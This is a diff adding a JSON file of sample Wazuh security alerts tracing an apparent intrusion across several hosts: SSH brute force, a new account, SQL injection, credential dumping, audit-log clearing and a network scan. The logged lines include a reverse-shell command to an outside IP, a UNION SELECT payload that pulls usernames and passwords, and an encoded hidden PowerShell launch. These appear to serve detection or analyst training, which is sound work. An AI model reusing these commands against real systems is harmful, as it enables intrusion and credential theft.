@@ -1,0 +1,336 @@
+[
+  {
+    "timestamp": "2026-11-04T08:12:03.512+0000",
+    "rule": {
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "id": "5712",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "001",
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.571210",
+    "decoder": {
+      "name": "sshd"
+    },
+    "full_log": "Nov  4 08:12:03 web-01 sshd[2211]: Invalid user admin from 203.0.113.45 port 51122",
+    "data": {
+      "srcip": "203.0.113.45"
+    }
+  },
+  {
+    "timestamp": "2026-11-04T08:14:40.002+0000",
+    "rule": {
+      "level": 12,
+      "description": "Multiple authentication failures followed by a success.",
+      "id": "40112",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_success"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "001",
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.4011212",
+    "decoder": {
+      "name": "sshd"
+    },
+    "full_log": "Nov  4 08:14:40 web-01 sshd[2290]: Accepted password for deploy from 203.0.113.45 port 51190 ssh2",
+    "data": {
+      "srcip": "203.0.113.45"
+    }
+  },
+  {
+    "timestamp": "2026-11-04T08:20:11.900+0000",
+    "rule": {
+      "level": 8,
+      "description": "New user added to the system.",
+      "id": "5902",
+      "groups": [
+        "syslog",
+        "adduser"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "001",
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.59028",
+    "decoder": {
+      "name": "adduser"
+    },
+    "full_log": "Nov  4 08:20:11 web-01 useradd[2301]: new user: name=svc_backup, UID=1002, GID=1002, home=/home/svc_backup"
+  },
+  {
+    "timestamp": "2026-11-04T08:25:52.114+0000",
+    "rule": {
+      "level": 13,
+      "description": "Reverse shell spawned from web server process",
+      "id": "100210",
+      "groups": [
+        "local",
+        "syscheck",
+        "attack"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "001",
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.10021013",
+    "decoder": {
+      "name": "syscheck"
+    },
+    "full_log": "apache2 -> /bin/sh -c bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
+    "data": {
+      "srcip": "198.51.100.23"
+    }
+  },
+  {
+    "timestamp": "2026-11-04T09:01:07.333+0000",
+    "rule": {
+      "level": 6,
+      "description": "SQL injection attempt.",
+      "id": "31103",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "002",
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.311036",
+    "decoder": {
+      "name": "accesslog"
+    },
+    "full_log": "192.0.2.77 - - [04/Nov/2026:09:01:07 +0000] \"GET /products.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1\" 200 512",
+    "data": {
+      "srcip": "192.0.2.77"
+    }
+  },
+  {
+    "timestamp": "2026-11-04T09:03:15.010+0000",
+    "rule": {
+      "level": 7,
+      "description": "Three failed attempts to run sudo",
+      "id": "5404",
+      "groups": [
+        "syslog",
+        "sudo"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "003",
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.54047",
+    "decoder": {
+      "name": "sudo"
+    },
+    "full_log": "Nov  4 09:03:15 db-01 sudo: www-data : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"
+  },
+  {
+    "timestamp": "2026-11-04T09:30:44.721+0000",
+    "rule": {
+      "level": 3,
+      "description": "PAM: Login session opened.",
+      "id": "5501",
+      "groups": [
+        "pam",
+        "syslog",
+        "authentication_success"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "003",
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.55013",
+    "decoder": {
+      "name": "syslog"
+    },
+    "full_log": "Nov  4 09:30:44 db-01 sshd[881]: pam_unix(sshd:session): session opened for user dbadmin"
+  },
+  {
+    "timestamp": "2026-11-04T10:02:19.400+0000",
+    "rule": {
+      "level": 12,
+      "description": "Windows command prompt started by an abnormal process",
+      "id": "92052",
+      "groups": [
+        "windows",
+        "sysmon"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "WIN-FS01",
+      "ip": "10.0.3.30"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.9205212",
+    "decoder": {
+      "name": "sysmon"
+    },
+    "full_log": "Process Create: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+  },
+  {
+    "timestamp": "2026-11-04T10:05:02.000+0000",
+    "rule": {
+      "level": 15,
+      "description": "Possible credential dumping: mimikatz sekurlsa::logonpasswords",
+      "id": "92900",
+      "groups": [
+        "windows",
+        "sysmon",
+        "credential_access"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "WIN-FS01",
+      "ip": "10.0.3.30"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.9290015",
+    "decoder": {
+      "name": "sysmon"
+    },
+    "full_log": "Process accessed lsass.exe with GrantedAccess 0x1010 SourceImage C:\\Users\\Public\\m.exe"
+  },
+  {
+    "timestamp": "2026-11-04T10:15:30.500+0000",
+    "rule": {
+      "level": 9,
+      "description": "The audit log was cleared",
+      "id": "60103",
+      "groups": [
+        "windows",
+        "windows_security",
+        "policy_changed"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "WIN-FS01",
+      "ip": "10.0.3.30"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.601039",
+    "decoder": {
+      "name": "windows_security"
+    },
+    "full_log": "Event 1102: The audit log was cleared. Subject: CORP\\jdoe"
+  },
+  {
+    "timestamp": "2026-11-04T11:00:00.000+0000",
+    "rule": {
+      "level": 5,
+      "description": "Listened ports status (netstat) changed (new port opened or closed).",
+      "id": "533",
+      "groups": [
+        "ossec"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "003",
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.5335",
+    "decoder": {
+      "name": "ossec"
+    },
+    "full_log": "ossec: output: 'netstat listening ports': tcp 0.0.0.0:5432"
+  },
+  {
+    "timestamp": "2026-11-04T11:45:12.000+0000",
+    "rule": {
+      "level": 11,
+      "description": "Network scan detected from internal host (nmap SYN scan)",
+      "id": "100300",
+      "groups": [
+        "ids",
+        "suricata"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "005",
+      "name": "ids-sensor",
+      "ip": "10.0.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "20261104.10030011",
+    "decoder": {
+      "name": "suricata"
+    },
+    "full_log": "ET SCAN Nmap Scripting Engine User-Agent Detected",
+    "data": {
+      "srcip": "10.0.3.30"
+    }
+  }
+]
